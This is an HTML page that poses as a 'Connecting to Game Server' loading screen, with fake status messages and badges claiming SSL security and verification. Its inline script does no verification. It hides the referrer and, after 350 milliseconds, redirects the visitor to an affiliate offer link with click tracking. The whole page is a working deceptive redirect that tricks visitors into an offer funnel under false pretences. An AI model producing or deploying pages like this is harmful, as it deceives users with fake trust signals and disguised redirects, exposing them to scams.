<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer">
<title>Loading...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0f;min-height:100vh;display:flex;align-items:center;justify-content:center;}
.card{background:linear-gradient(135deg,#1a0a2e,#2d1054);border:1px solid rgba(124,58,237,0.4);border-radius:20px;padding:50px 40px;text-align:center;max-width:420px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.5);}
.🌐{font-size:60px;margin-bottom:24px;}
h1{color:#fff;font-size:1.6rem;font-weight:700;margin-bottom:10px;}
p{color:rgba(255,255,255,0.6);font-size:0.95rem;line-height:1.6;margin-bottom:28px;}
.bar-wrap{background:rgba(255,255,255,0.08);border-radius:50px;height:8px;overflow:hidden;margin-bottom:14px;}
.bar{height:100%;background:linear-gradient(90deg,#7c3aed,#7c3aed aa);border-radius:50px;width:0;animation:load 350ms linear forwards;}
@keyframes load{to{width:100%}}
.status{color:rgba(255,255,255,0.4);font-size:0.82rem;}
.trusted{margin-top:20px;display:flex;justify-content:center;gap:14px;}
.badge{background:rgba(124,58,237,0.15);border:1px solid rgba(124,58,237,0.4);color:#7c3aed;font-size:0.72rem;font-weight:600;padding:4px 12px;border-radius:20px;}
</style>
</head>
<body>
<div class="card">
  <div class="🌐">🌐</div>
  <h1>Connecting to Game Server...</h1>
  <p>Please wait while we verify your access. You'll be redirected in a moment.</p>
  <div class="bar-wrap"><div class="bar"></div></div>
  <div class="status" id="s">Preparing your session...</div>
  <div class="trusted">
    <div class="badge">🔒 SSL Secured</div>
    <div class="badge">✓ Verified</div>
    <div class="badge">⚡ Fast</div>
  </div>
</div>
<script>
var offer='https://safeoffers.pro/a/Wyv9u8xNhx97V' + '?utm_source=direct' + '&dir_ai_01=dir_ai_01' + '&clickid=clk_' + Math.random().toString(36).substr(2,9);
var msgs=['Preparing your session...','Checking server...','Loading content...','Almost ready...'];
var i=0;
var iv=setInterval(function(){document.getElementById('s').textContent=msgs[Math.min(i++,msgs.length-1)];},350/4);
setTimeout(function(){clearInterval(iv);document.getElementById('s').textContent='Redirecting...';window.location.href=offer;},350);
</script>
</body>
</html>
